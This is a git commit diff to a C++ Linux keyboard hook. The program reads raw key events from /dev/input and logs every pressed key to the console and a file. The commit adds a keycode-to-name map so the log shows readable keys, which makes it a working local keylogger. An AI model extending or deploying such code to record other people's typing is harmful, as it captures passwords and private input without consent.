d27d078dfce2bc884238148d5e4d61d35b3feb39
Dmytro Ostapenko <ostapenko.dmytro05@gmail.com>
2025-04-09 19:09:28 +0300

    impove logging

--- keyboard_hook.cpp
+++ keyboard_hook.cpp
@@ -7,6 +7,41 @@
 #include <sys/ioctl.h>
 #include <cstring>
 #include <vector>
+#include <unordered_map>
+
+const std::unordered_map<int, std::string> keyMap = {
+    {KEY_A, "A"}, {KEY_B, "B"}, {KEY_C, "C"}, {KEY_D, "D"},
+    {KEY_E, "E"}, {KEY_F, "F"}, {KEY_G, "G"}, {KEY_H, "H"},
+    {KEY_I, "I"}, {KEY_J, "J"}, {KEY_K, "K"}, {KEY_L, "L"},
+    {KEY_M, "M"}, {KEY_N, "N"}, {KEY_O, "O"}, {KEY_P, "P"},
+    {KEY_Q, "Q"}, {KEY_R, "R"}, {KEY_S, "S"}, {KEY_T, "T"},
+    {KEY_U, "U"}, {KEY_V, "V"}, {KEY_W, "W"}, {KEY_X, "X"},
+    {KEY_Y, "Y"}, {KEY_Z, "Z"},
+    {KEY_1, "1"}, {KEY_2, "2"}, {KEY_3, "3"}, {KEY_4, "4"}, {KEY_5, "5"},
+    {KEY_6, "6"}, {KEY_7, "7"}, {KEY_8, "8"}, {KEY_9, "9"}, {KEY_0, "0"},
+    {KEY_ENTER, "Enter"},
+    {KEY_SPACE, "Space"},
+    {KEY_BACKSPACE, "Backspace"},
+    {KEY_TAB, "Tab"},
+    {KEY_ESC, "Esc"},
+    {KEY_LEFTSHIFT, "Shift"}, {KEY_RIGHTSHIFT, "Shift"},
+    {KEY_LEFTCTRL, "Ctrl"}, {KEY_RIGHTCTRL, "Ctrl"},
+    {KEY_LEFTALT, "Alt"}, {KEY_RIGHTALT, "Alt"},
+    {KEY_DOT, "."}, {KEY_COMMA, ","},
+    {KEY_MINUS, "-"}, {KEY_EQUAL, "="},
+    {KEY_SLASH, "/"}, {KEY_BACKSLASH, "\\"},
+    {KEY_SEMICOLON, ";"}, {KEY_APOSTROPHE, "'"},
+    {KEY_LEFTBRACE, "["}, {KEY_RIGHTBRACE, "]"}
+};
+
+std::string getKeyName(int code) {
+    auto it = keyMap.find(code);
+    if (it != keyMap.end()) {
+        return it->second;
+    } else {
+        return "UNKNOWN_KEY_" + std::to_string(code);
+    }
+}
 
 const std::string DEV_INPUT_PATH = "/dev/input/";
 const int MAX_EVENTS = 32;
@@ -68,11 +103,11 @@ int main() {
     }
 
     struct input_event ev;
-    while (true) {
-        ssize_t bytes = read(fd, &ev, sizeof(ev));
-        if (bytes == sizeof(ev) && ev.type == EV_KEY && ev.value == 1) {
-            std::cout << "Код клавіші: " << ev.code << std::endl;
-            logFile << "Код клавіші: " << ev.code << std::endl;
+    while (read(fd, &ev, sizeof(ev)) > 0) {
+        if (ev.type == EV_KEY && ev.value == 1) {
+            std::string keyName = getKeyName(ev.code);
+            std::cout << keyName << std::endl;
+            logFile << keyName << std::endl;
         }
     }
 
